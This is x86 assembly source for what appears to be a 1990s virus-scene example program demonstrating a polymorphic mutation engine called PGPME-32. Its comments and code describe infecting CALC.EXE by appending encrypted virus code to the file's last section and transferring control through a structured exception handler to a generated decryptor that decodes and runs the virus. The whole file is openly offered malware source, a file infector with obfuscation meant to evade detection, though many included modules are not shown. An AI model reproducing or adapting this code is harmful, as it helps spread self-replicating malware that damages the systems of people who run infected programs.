
; PGPME-32 / build 001
;
; PGP-Morphic 32-BIT -- Mutation Engine -- Example program
;
; This program will append to last section of CALC.EXE file.
; Encrypted code will only be decrypted, then controll will be passed to
; host program.
;
; General difference from two previous engines (PGPM1/2) is what PGPME32
; transfers control to main decryptor using SEH.
;
;   infected-program  ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;                 ³   ³ header           ³
;                 ÀÄ> ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
;                     ³ .code            ³
;                     ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
;                     ³ .data            ³
;                     ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
;                     ³ .last section    ³  generated by PGPM32
;                     Ã - - - - - - - - -´   ³
;                     ³ --PGP--      <ÄÄÄÄÄÄÄÙ
;                     ³ abcd12345678     ³
; EntryPointRva ÄÄÄÄÄÄÄÄÄÄ> 12345678     ³
;                     ³ abcd12345678 - - - - -> 1. generate main decryptor
;                     ³ abcd12345678     ³      2. install SEH
;                     ³ --PGP--          ³      3. cause gpf or also
;                     ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
;
; main decryptor:
;
;   1. restore ESP/EBP, remove SEH
;   2. find virus start in 1st decryptor
;   3. decode virus
;   4. jmp virus_entrypoint
;
; Well, i'm not master of comments, so let other words be said by code...
;

include                 pushad.inc
include                 mz.inc
include                 pe.inc
include                 export_h.inc
include                 exp_h.inc
include                 seh.inc
include                 fio_h.inc
include                 fioex_h.inc
include                 pgpme_h.inc


                        p386
                        model   flat

                        locals  __

                        .code

initfile                db      'calc.exe',0

startup:
                        call    encrypt_cpr

                        lea     esi, start
                        lea     edi, madafucka
                        mov     ecx, virmemory
                        cld
                        rep     movsb
                        lea     edi, start
                        mov     ecx, virmemory
                        xor     al, al
                        rep     stosb

                        pop     ebx
                        push    ebx
                        lea     eax, init_exp
                        add     eax, madafucka-start
                        call    eax
                        jz      __exit

                        lea     edx, initfile
                        lea     eax, infect_file
                        add     eax, madafucka-start
                        call    eax

__exit:                 ret

encrypt_cpr:            pusha
                        lea     esi, cpr_start
                        mov     ecx, cpr_size
__cycle:                cmp     byte ptr [esi], 32
                        jb      __skip
                        not     byte ptr [esi]
__skip:                 inc     esi
                        loop    __cycle
                        popa
                        ret

                        .data

virus_c_start:
start:
                        db      10*4096 dup (0CCh)
                        org     start

VIRUS_ID                equ     0deadfacch
                        dd      VIRUS_ID


get_base_ebp:           call    $+5
                        pop     ebp
                        sub     ebp, offset $-1
                        ret

pe_entrypoint:
                        nop
                        nop

                        db      68h
pe_retaddr              dd      ?
                        ret

include                 string_c.inc
include                 export_c.inc
include                 fio_c.inc
include                 fioex_c.inc
include                 random_c.inc
include                 exp_c.inc
include                 pgpme_c.inc
include                 infect_c.inc

virus_c_size            equ     $-virus_c_start
virus_i_start:

include                 cpr.inc
include                 exp_i.inc
include                 pgpme_i.inc

virsize                 equ     $-start
virus_i_size            equ     $-virus_i_start
virus_u_start:

include                 random_u.inc
include                 exp_u.inc
include                 pgpme_u.inc
include                 infect_u.inc

virus_u_size            equ     $-virus_u_start

virmemory               equ     $-start

include                 stat.inc

madafucka               db      virmemory dup ('X')

                        end     startup
